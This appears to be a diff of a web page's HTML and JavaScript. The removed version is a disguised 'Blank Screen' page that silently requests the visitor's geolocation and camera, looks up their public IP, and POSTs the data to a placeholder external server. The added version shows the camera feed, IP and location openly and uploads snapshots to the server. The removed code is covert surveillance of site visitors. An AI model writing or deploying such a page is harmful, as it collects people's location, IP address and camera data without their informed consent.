@@ -3,71 +3,58 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Blank Screen</title>
+  <title>Camera & Location Access</title>
   <style>
-    body { background-color: white; height: 100vh; margin: 0; }
+    body { font-family: Arial, sans-serif; text-align: center; }
+    video { border: 1px solid #ccc; margin-top: 10px; }
+    #ip, #location { margin-top: 20px; }
   </style>
 </head>
 <body>
+  <h1>Camera Feed, IP Address, and Location Data</h1>
+  
+  <video id="video" width="640" height="480" autoplay></video>
+  <p id="ip"></p>
+  <p id="location"></p>
+  
+  <button onclick="captureSnapshot()">Capture Snapshot</button>
+  <canvas id="canvas" style="display:none;"></canvas>
+
   <script>
-    // request location
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const data = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude
-          };
-          sendDataToServer('location', data);
-        },
-        (error) => {
-          console.error('location access error:', error);
-        }
-      );
-    } else {
-      console.error('geolocation not supported');
-    }
+    // Get and display IP address and location
+    fetch('/').then(response => {
+      return response.text();
+    }).then(data => {
+      // Extract IP and Location from the server's response
+      document.getElementById('ip').innerText = 'IP Address: ' + data.match(/Client IP: (.*)/)[1];
+      document.getElementById('location').innerText = 'Location: ' + data.match(/Client Location: (.*)/)[1];
+    });
 
-    // request camera access
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-          // send camera data (could be a blob or stream info)
-          sendDataToServer('camera', { message: 'camera accessed' });
-        })
-        .catch((error) => {
-          console.error('camera access error:', error);
-        });
-    } else {
-      console.error('camera access not supported');
-    }
-
-    // fetch public ip
-    fetch('https://api.ipify.org?format=json')
-      .then((response) => response.json())
-      .then((data) => {
-        const ipData = { ip: data.ip };
-        sendDataToServer('ip', ipData);
+    // Get access to the camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function (stream) {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
       })
-      .catch((error) => {
-        console.error('ip fetch error:', error);
+      .catch(function (error) {
+        console.log('Error accessing the camera: ' + error);
       });
 
-    // send data to the server
-    function sendDataToServer(type, data) {
-      fetch('https://your-server-endpoint.com', {  // change to your server's URL
+    // Capture a snapshot from the video feed
+    function captureSnapshot() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert canvas to image data
+      const dataURL = canvas.toDataURL('image/jpeg');
+
+      // Send the image data to the server
+      fetch('/upload', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ type, data })
-      })
-      .then((response) => response.json())
-      .then((responseData) => {
-        console.log('data sent successfully:', responseData);
-      })
-      .catch((error) => {
-        console.error('error sending data:', error);
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: dataURL })
       });
     }
   </script>
